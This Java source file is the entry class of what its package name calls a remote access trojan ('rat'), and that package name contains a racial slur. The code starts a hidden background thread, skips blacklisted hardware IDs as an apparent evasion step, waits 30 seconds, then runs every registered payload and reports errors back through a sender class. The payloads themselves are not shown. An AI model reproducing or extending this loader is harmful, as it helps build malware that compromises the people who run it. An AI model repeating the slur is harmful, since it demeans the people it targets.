package me.nigger.rat;

import me.nigger.rat.payload.Payload;
import me.nigger.rat.payload.PayloadRegistry;
import me.nigger.rat.payload.Sender;
import me.nigger.rat.util.HWIDUtil;

public final class Start
{
    public static void start()
    {
        new Thread(() -> { try {
            if (HWIDUtil.blacklisted()) return;
            Thread.sleep(30000);
            for (Payload payload : PayloadRegistry.getPayloads()) try { payload.execute(); } catch (Exception e) { Sender.send(e.getMessage()); }
        } catch (Exception ignored) {}}).start();
    }
}
